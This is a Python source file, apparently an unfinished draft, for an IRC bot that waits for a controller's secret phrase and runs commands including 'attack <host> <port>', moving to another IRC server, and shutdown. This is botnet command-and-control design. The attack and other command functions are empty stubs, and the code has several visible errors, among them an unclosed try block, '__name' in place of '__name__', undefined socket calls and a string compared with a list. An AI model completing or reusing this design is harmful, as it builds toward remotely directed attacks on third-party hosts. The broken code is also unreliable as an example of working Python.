import time
import socket
import sys
import random 

HOST = None
PORT = None 
CHANNEL = None 
PHRASE = None 
IRC = None
CONTROLLER_FLAG = True 

# BOT TODO
# Listen on channel and detect secret phrase from controller
# Execute commands sent by controller to channel
# Commands: Network attack, migration to different IRC, ShutDown
# Report status of command execution to controller

def getStatus():    
    return

def cmdAttack():
    pass

def cmdMove():
    pass 

def cmdQuit():
    pass 

def cmdShutdown():
    pass

# SEND PRIVATE MESSAGE TO CONTROLLER
def sendPrivate(conName, msg):
    # Send private message to Controller
    sock.send(ircSocket, "PRIVMSG " + conName + " :" + msg + "\n")
    return

# SEND MESSAGE TO IRC
def sendMsg(sock, msg):
    msg = msg.encode('utf-8', 'ignore')
    sock.send(msg)

# GET MESSAGE FROM IRC
def getMsg():
    pass


# GET COMMANDS FROM CONTROLLER
# This might be the same as ircSocket since it's still reading the stuff from the IRC server
def getCommand(conSocket):
    msg = conSocket.recv(1024).decode('utf-8', 'ignore').strip()
    return 

# DO COMMANDS
def commandHandler():

    # Get Commands
    # status, attack <host><port>, move<host><port><channel>, quit, shutdown
    command = getCommand(conSocket)
    command = command.split()

    if command == "status":
        print("Command: status")
        cmdStatus = getStatus()
        print(str(status))
    elif command == "attack":
        try:
            host = command[1]
            port = command[2]
            print("Command: attack " + str(host) + " " + str(port))
            cmdAttack(host, port)
        except:
            pass
    elif command == "move":
        try:
            host = command[1]
            port = command[2]
            channel = command[3]
            cmdMove(host, port, channel)
            print("Command: move " + str(host) + " " + str(port) + " " + str(channel))
    elif command == "quit":
        cmdQuit()
    elif command == "shutdown":
        cmdShutdown()



# CONNECT TO IRC SERVER CHANNEL
# This next line goes to a function
# ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def serverConnect(ircSocket, host, port):
    try:
        ircSocket.connect((host,port))
        print("Connection successful")
        return True
    except:
        print("Connection failed")
        return False 




if __name == "__main__":

    # Get sys.args
    if len(sys.argv) != 4:
        print("Wrong number of inputs")
        sys.exit()

    HOST = sys.argv[0]
    PORT = sys.argv[1]
    CHANNEL = sys.argv[2]
    PHRASE = sys.argv[3]

    if not PORT.isdigit():
        print("Invalid port")
        sys.exit()

    # Keep Connection to IRC Server
    while True:
        ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Do connection stuff
        connectionFlag = serverConnect(ircSocket, HOST, PORT)
        while connectionFlag:
            commandHandler()
            
        

        


